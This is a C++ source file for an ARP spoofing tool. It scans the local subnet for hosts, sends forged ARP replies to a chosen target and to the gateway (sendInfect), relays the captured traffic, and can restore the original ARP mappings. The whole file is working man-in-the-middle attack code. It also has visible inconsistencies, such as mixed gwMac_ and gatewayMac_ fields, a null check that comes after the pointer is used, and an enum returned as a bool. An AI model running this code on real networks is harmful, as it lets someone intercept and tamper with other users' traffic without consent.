#include "netinfo.h"
#include "arpspoof.h"
bool ArpSpoof::prepare()
{
    bool res = PcapDevice::doOpen();
    if (!res) return false;
    spdlog::info("Arpspoof::Pcapdevice open");

    while (true) {
        //find gateway mac
        std::this_thread::sleep_for(std::chrono::milliseconds(sendSleepTime_*2));
        for(int i =0; i<3; i++) {
            sendQuery(gwIp_);
            spdlog::info("Gateway ip" + std::string(gwIp_));
            std::this_thread::sleep_for(std::chrono::milliseconds(sendSleepTime_));
        }
        EthPacket packet;
        Packet::Result res = read(&packet);
        if (res == Packet::Eof) {
            spdlog::info("Arpspoof::Packet::Eof");
            break;
        } else
        if (res == Packet::Fail) {
            spdlog::info("Arpspoof::Packet::Fail");
            break;
        } else
        if (res == Packet::None) {
            spdlog::info("Arpspoof::Packet::None");
            continue;
        }
        spdlog::info("Arpspoof::Packet::correct");
        ArpHdr* arpHdr = packet.arpHdr_;
        if (arpHdr == nullptr) continue;
        if (arpHdr->op() != ArpHdr::Reply) continue;

        Ip sip = arpHdr->sip();
        Mac smac = arpHdr->smac();

        if (sip == gwIp_) {
            gwMac_ = smac;
            spdlog::info("Get gatewayMac!!"+std::string(gwMac_));
            break;
        }
    }
    return true;
}

bool ArpSpoof::doOpen()
{
    //find best interface
    RtmEntry* entry = NetInfo::instance().rtm().getBestEntry(std::string("8.8.8.8"));
    if (entry != nullptr) {
        intf_ = entry->intf();
        gwIp_ = intf_->gateway();
        if (intf_ != nullptr)
            intfName_ = intf_->name();
    }
    myIp_ = intf_->ip();
    myMac_ = intf_->mac();
    return true;
}

bool ArpSpoof::doClose()
{
    return PcapDevice::doClose();
}

void ArpSpoof::hostScan()
{
    Ip begIp = (myIp_ & intf_->mask()) + 1;
    Ip endIp = (myIp_ | ~intf_->mask());

    EthArpPacket packet;

    EthHdr* ethHdr = &packet.ethHdr_;
    ethHdr->dmac_ = Mac::broadcastMac();
    ethHdr->smac_ = myMac_;
    ethHdr->type_ = htons(EthHdr::Arp);

    ArpHdr* arpHdr = &packet.arpHdr_;
    arpHdr->hrd_ = htons(ArpHdr::ETHER);
    arpHdr->pro_ = htons(EthHdr::Ip4);
    arpHdr->hln_ = Mac::SIZE;
    arpHdr->pln_ = Ip::SIZE;
    arpHdr->op_ = htons(ArpHdr::Request);
    arpHdr->smac_ = myMac_;
    arpHdr->sip_ = htonl(myIp_);
    arpHdr->tmac_ = Mac::nullMac();

    while (active()) {
        for (Ip ip = begIp; ip <= endIp; ip = ip + 1) {
            arpHdr->tip_ = htonl(ip);
            if (!active()) break;
            Packet::Result res = write(Buf(pbyte(&packet), sizeof(packet)));
            if (res != Packet::Ok) {
                spdlog::info("Arpspoof::hostscan::error");
                break;
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(sendSleepTime_));
        }
        if (!active()) break;
        std::this_thread::sleep_for(std::chrono::milliseconds(rescanSleepTime_));
    }

}

bool ArpSpoof::processArp(EthHdr* ethHdr, ArpHdr* arpHdr, Mac* mac, Ip* ip)
{
    //already infected
    if (ethHdr->smac() != arpHdr->smac()) {
        spdlog::info("ARP spoofing detected by arp" + std::string(ethHdr->smac()) + " " + std::string(arpHdr->smac()) +" "+ std::string(arpHdr->sip()));
        return false;
    }

    *mac = arpHdr->smac();
    *ip = arpHdr->sip();
    spdlog::info("Host detected by arp" + std::string(*mac) + " " + std::string(*ip));
    return true;
}

bool ArpSpoof::processDhcp(Packet* packet, Mac* mac, Ip* ip)
{
    UdpHdr* udpHdr = packet->udpHdr_;
    if (udpHdr == nullptr) return false;

    if (!(udpHdr->sport() == 67 || udpHdr->dport() == 67)) return false;

    Buf dhcp = packet->udpData_;
    if (dhcp.data_ == nullptr) return false;
    if (dhcp.size_ < sizeof(DhcpHdr)) return false;

    DhcpHdr* dhcpHdr = PDhcpHdr(dhcp.data_);

    bool ok = false;
    if (dhcpHdr->yourIp() != 0) { // DHCP Offer of DHCP ACK sent from server
        *mac = dhcpHdr->clientMac();
        *ip = dhcpHdr->yourIp();
        ok = true;
    }
    spdlog::info("Host detected by dhcp" + std::string(*mac) + " " + std::string(*ip));
    return ok;
}

Flow ArpSpoof::detect(Packet* packet)
{
    Mac mac;
    Ip ip;
    Flow host;

    EthHdr* ethHdr = packet->ethHdr_;
    if (ethHdr == nullptr) return host;

    mac = ethHdr->smac();
    if (mac == myMac_) return host;

    bool detected = false;

    //find by dhcp packet
    IpHdr* ipHdr = packet->ipHdr_;
    if (ipHdr != nullptr && ipHdr->sip() != myIp_) {
        if (processDhcp(packet, &mac, &ip))
            detected = true;
    }

    //find by arp packet
    ArpHdr* arpHdr = packet->arpHdr_;
    if (arpHdr != nullptr) {
        if (processArp(ethHdr, arpHdr, &mac, &ip))
            detected = true;
    }

    if (!detected) return host;

    host.mac_ = mac;
    host.ip_ = ip;
    struct timeval now;
    gettimeofday(&now, NULL);
    host.lastAccess_ = now; // for check 15min

    spdlog::info("host detected: "+ std::string(mac) + " " + std::string(ip));
    return host;
}


bool ArpSpoof::sendQuery(Ip tip)
{
    EthArpPacket query;
    query.ethHdr_.dmac_ = Mac::broadcastMac();
    query.ethHdr_.smac_ = intf_->mac();
    query.ethHdr_.type_ = htons(EthHdr::Arp);

    query.arpHdr_.hrd_ = htons(ArpHdr::ETHER);
    query.arpHdr_.pro_ = htons(EthHdr::Ip4);
    query.arpHdr_.hln_ = sizeof(Mac);
    query.arpHdr_.pln_ = sizeof(Ip);
    query.arpHdr_.op_ = htons(ArpHdr::Request);
    query.arpHdr_.smac_ = intf_->mac();
    query.arpHdr_.sip_ = htonl(intf_->ip());
    query.arpHdr_.tip_ = htonl(tip);
    query.arpHdr_.tmac_ = Mac::nullMac();
    Buf queryBuf(pbyte(&query), sizeof(query));

    Packet::Result res = write(queryBuf);
    if (res != Packet::Ok) {
        spdlog::info("Arpspoof::sendquery::error");
        return false;
    }
    spdlog::info("Arpspoof::sendquery::correct");
    return true;
}

bool ArpSpoof::sendInfect(Flow flow)
{
    spdlog::info(string(flow.ip_));
    EthArpPacket packet;

    EthHdr *ethHdr = &packet.ethHdr_;
    ethHdr->dmac_ = Mac::nullMac();
    ethHdr->smac_ = intf_->mac_;
    ethHdr->type_ = htons(EthHdr::Arp);

    ArpHdr *arpHdr = &packet.arpHdr_;
    arpHdr->hrd_ = htons(ArpHdr::ETHER);
    arpHdr->pro_ = htons(EthHdr::Ip4);
    arpHdr->hln_ = Mac::SIZE;
    arpHdr->pln_ = Ip::SIZE;
    arpHdr->op_ = htons(ArpHdr::Reply);
    arpHdr->smac_ = intf_->mac_;
    arpHdr->tmac_ = Mac::nullMac();

    //  gateway send
    ethHdr->dmac_ = gatewayMac_;
    arpHdr->sip_ = htonl(flow.ip_);
    arpHdr->tmac_ = gatewayMac_;
    arpHdr->tip_ = htonl(intf_->gateway());
    write(Buf(pbyte(&packet), sizeof(packet)));

    //  target send
    ethHdr->dmac_ = flow.mac_;
    arpHdr->sip_ = htonl(intf_->gateway());
    arpHdr->tmac_ = flow.mac_;
    arpHdr->tip_ = htonl(flow.ip_);
    Packet::Result res = write(Buf(pbyte(&packet), sizeof(packet)));

    if (res != Packet::Ok) {
        spdlog::info("Arpspoof::infection::error");
        return false;
    }
    return res;
}

bool ArpSpoof::sendRecover(Flow flow)
{
    spdlog::info(std::string(flow.ip_));
    EthArpPacket packet;

    EthHdr *ethHdr = &packet.ethHdr_;
    ethHdr->dmac_ = Mac::nullMac();
    ethHdr->smac_ = intf_->mac_;
    ethHdr->type_ = htons(EthHdr::Arp);

    ArpHdr *arpHdr = &packet.arpHdr_;
    arpHdr->hrd_ = htons(ArpHdr::ETHER);
    arpHdr->pro_ = htons(EthHdr::Ip4);
    arpHdr->hln_ = Mac::SIZE;
    arpHdr->pln_ = Ip::SIZE;
    arpHdr->op_ = htons(ArpHdr::Reply);
    arpHdr->smac_ = Mac::nullMac();
    arpHdr->tmac_ = Mac::nullMac();

    //  gateway send
    ethHdr->dmac_ = gatewayMac_;
    arpHdr->smac_ = flow.mac_;
    arpHdr->sip_ = htonl(flow.ip_);
    arpHdr->tmac_ = gatewayMac_;
    arpHdr->tip_ = htonl(intf_->gateway());
    Packet::Result res = write(Buf(pbyte(&packet), sizeof(packet)));
    if (res != Packet::Ok) {
        spdlog::info("Arpspoof::recover::error");
        return false;
    }

    //  target send
    ethHdr->dmac_ = flow.mac_;
    arpHdr->smac_ = gatewayMac_;
    arpHdr->sip_ = htonl(intf_->gateway());
    arpHdr->tmac_ = flow.mac_;
    arpHdr->tip_ = htonl(flow.ip_);
    res = write(Buf(pbyte(&packet), sizeof(packet)));
    if (res != Packet::Ok) {
        spdlog::info("Arpspoof::recover::error");
        return false;
    }
    return true;
}

Packet::Result ArpSpoof::relay(Packet* packet) {
    packet->ethHdr_->smac_ = intf_->mac_;
    Packet::Result res = write(packet);
    if (res != Packet::Ok) {
        spdlog::info("Arpspoof::relay::error");
        return res;
    }
    return res;
}

